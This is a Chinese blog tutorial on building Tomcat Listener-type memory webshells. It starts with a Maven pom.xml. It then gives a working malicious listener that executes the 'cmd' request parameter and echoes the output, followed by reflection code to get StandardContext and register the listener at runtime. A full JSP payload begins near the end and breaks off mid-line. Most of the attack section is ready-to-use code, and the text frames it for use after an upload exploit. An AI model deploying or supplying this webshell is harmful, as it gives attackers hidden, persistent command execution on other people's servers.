class="hljs dust"><span class="language-xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>demo Maven Webapp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://www.example.com<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.7<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.7<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span></span><br><span class="language-xml">    </span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">outputDirectory</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;basedir&#125;</span><span class="language-xml">/target/webapp/WEB-INF/classes<span class="hljs-tag">&lt;/<span class="hljs-name">outputDirectory</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">pluginManagement</span>&gt;</span><span class="hljs-comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-clean-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-resources-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.22.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-war-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-install-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">pluginManagement</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>



<h3 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h3><p>​		listenre顾名思义，监听某一事件的发生，状态改变等，监听器可以监听资源的b变化，简单说就是在 <code>application</code>，<code>session</code>，<code>request</code> 三个对象创建、销毁或者往其中添加修改删除属性时自动执行代码的功能组件。</p>
<p>​		请求网站的时候，程序会先执行listener监听器的内容，tomcat三大组件执行顺序：Listener-&gt;Filter-&gt;Servlet。Listerner的优先级是相对比较高的，因此可以利用Listener组件注册内存马。Listener类型包括一下三种：</p>
<ul>
<li>ServletContextListener：服务器启动和终止时触发</li>
<li>HttpSessionListener：有关Session操作时触发</li>
<li>ServletRequestListener：访问服务时触发</li>
</ul>
<p>​		最适合做内存马的当然是SercletRequestListener，只要访问服务或网络请求，都会触发监听器，从而执行<code>ServletRequestListener#requestInitialized()</code>，接下来，我们在服务器后端写一个恶意监听器。</p>
<h4 id="恶意Listener监听器"><a href="#恶意Listener监听器" class="headerlink" title="恶意Listener监听器"></a>恶意Listener监听器</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/Listener_memshell.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> jdk.nashorn.internal.ir.RuntimeNode;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Listener_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br>        <span class="hljs-comment">// 获取request请求</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        <span class="hljs-comment">// 获取response请求</span><br><br>        <span class="hljs-comment">// 获取参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-comment">// 获得response响应</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request) requestF.get(req);<br>                <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) request.getResponse();<br><br>                <span class="hljs-comment">// 执行命令</span><br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                response.getWriter().write(<span class="hljs-string">&quot;Listener_memshell 被执行\n&quot;</span>);<br>                <span class="hljs-type">int</span> len;<br>                <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                    response.getWriter().write(len);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>访问任意路由都可触发命令执行。</p>
<p><img src="https://img-blog.csdnimg.cn/1ca351e3f37b464fa49aa85444d19c0c.png" srcset="/img/loading.gif" lazyload alt="image-20221125100826079"></p>
<p>​		当然，这是我们直接在服务器后端生成的Listener，在实际利用中我们不可能直接在服务器上添加Listener，大多数情况，我们都是先通过文件上传等方式获得任意代码执行的权限，之后通过执行代码的形式向服务器中添加Servlet，接下来我们详细介绍一下如何通过任意代码执行向服务器中植入Listener内存马。</p>
<h4 id="动态注册Listener流程"><a href="#动态注册Listener流程" class="headerlink" title="动态注册Listener流程"></a>动态注册Listener流程</h4><p>​		在实际生活中，我们不可能直接将恶意Listener类部署到服务器上，因此我们需要找到，服务器是添加Listener的具体过程，手动调用添加Listener，从而注入内存马。在<code>requestInitialized()</code>处下断点，查看其调用栈。</p>
<p><img src="https://img-blog.csdnimg.cn/e577bb46d9b14f33ad8a7c4254da566c.png" srcset="/img/loading.gif" lazyload alt="image-20221125111212800"></p>
<p>通过调用连可以发现，Tomcat在<code>StandardContext#fireRequestInitEvent</code>处调用了我们的恶意Listener。</p>
<p><img src="https://img-blog.csdnimg.cn/94f9c7c5760945aeb8e90f09562d2567.png" srcset="/img/loading.gif" lazyload alt="image-20221125111310722"></p>
<p>而恶意Listener存储在instances，由<code>StandardContext#getApplicationEventListeners</code>获取，继续跟进<code>StandardContext#getApplicationEventListeners</code>。</p>
<p><img src="https://img-blog.csdnimg.cn/1de515b2aa1e4be2aa3960eda445d011.png" srcset="/img/loading.gif" lazyload alt="image-20221125111551102"></p>
<p><code>getApplicationEventListeners</code>调用<code>applicationEventListenersList.toArray()</code>，而<code>applicationEventListenersList</code>是定义在<code>StandardContext</code>的私有数组，因此我们的目标就变成了如何在<code>applicationEventListenersList</code>数组中添加我们的恶意Listener。</p>
<p><img src="https://img-blog.csdnimg.cn/825f12fe7129459393e433dfabbb3c8c.png" srcset="/img/loading.gif" lazyload alt="image-20221125111603197"></p>
<p><img src="https://img-blog.csdnimg.cn/5f334403d9ec4b48a3164cad6229a32b.png" srcset="/img/loading.gif" lazyload alt="image-20221125111629584"></p>
<p>继续向下寻找，我们会找到<code>StandardContext#addApplicationEventListener</code>方法，注释表明该方法用于添加一个监听器，由此可知，我们只需要获得一个<code>StandardContext</code>对象，然后调用<code>addApplicationEventListener</code>即可添加我们的恶意Listener。</p>
<p><img src="https://img-blog.csdnimg.cn/0fc87665a1154d238f5b1aceadb805fd.png" srcset="/img/loading.gif" lazyload alt="image-20221125111905905"></p>
<p>现在，我们可以直到动态注册Listener内存马基本步骤了：</p>
<ul>
<li>1.编写恶意Listener监听器。</li>
<li>2.获取StandardContext。</li>
<li>3.动态注册恶意Listener监听器。</li>
</ul>
<h4 id="构造Listener内存马"><a href="#构造Listener内存马" class="headerlink" title="构造Listener内存马"></a>构造Listener内存马</h4><h5 id="编写恶意Listener监听器"><a href="#编写恶意Listener监听器" class="headerlink" title="编写恶意Listener监听器"></a>编写恶意Listener监听器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Listener_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br>            <span class="hljs-comment">// 获取request请求</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-comment">// 获取参数</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// 获得response响应</span><br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                    requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request) requestF.get(req);<br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) request.getResponse();<br><br>                    <span class="hljs-comment">// 执行命令</span><br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                    response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                    response.getWriter().write(<span class="hljs-string">&quot;Listener_memshell 被执行\n&quot;</span>);<br>                    <span class="hljs-type">int</span> len;<br>                    <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                        response.getWriter().write(len);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br><br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>



<h5 id="获得StandardContext对象"><a href="#获得StandardContext对象" class="headerlink" title="获得StandardContext对象"></a>获得StandardContext对象</h5><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类，我们可以模仿其获取方法获取<code>StandardContext</code>对象。</p>
<p><img src="https://img-blog.csdnimg.cn/a392a22cda424e9ab166cff275f36144.png" srcset="/img/loading.gif" lazyload alt="image-20221125112340385"></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;%<br>    Field reqF <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>)<span class="hljs-comment">;</span><br>    reqF.setAccessible(true)<span class="hljs-comment">;</span><br>    Request req <span class="hljs-operator">=</span> (Request) reqF.get(request)<span class="hljs-comment">;</span><br>    StandardContext context <span class="hljs-operator">=</span> (StandardContext) req.getContext()<span class="hljs-comment">;</span><br>%&gt;<br></code></pre></td></tr></table></figure>

<p>此外，还有一些其他方法获取<code>StandardContext</code>对象。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;%<br>	WebappClassLoaderBase webappClassLoaderBase <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br>    StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext()<span class="hljs-comment">;</span><br>%&gt;<br></code></pre></td></tr></table></figure>

<h5 id="动态注册Listener"><a href="#动态注册Listener" class="headerlink" title="动态注册Listener"></a>动态注册Listener</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 添加恶意Listener<br>Listener_memshell listener_memshell <span class="hljs-operator">=</span> new Listener_memshell()<span class="hljs-comment">;</span><br>context.addApplicationEventListener(listener_memshell)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h4 id="Listener内存马完整代码"><a href="#Listener内存马完整代码" class="headerlink" title="Listener内存马完整代码"></a>Listener内存马完整代码</h4><p>根据上述三个步骤构建的payload如下所示。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span 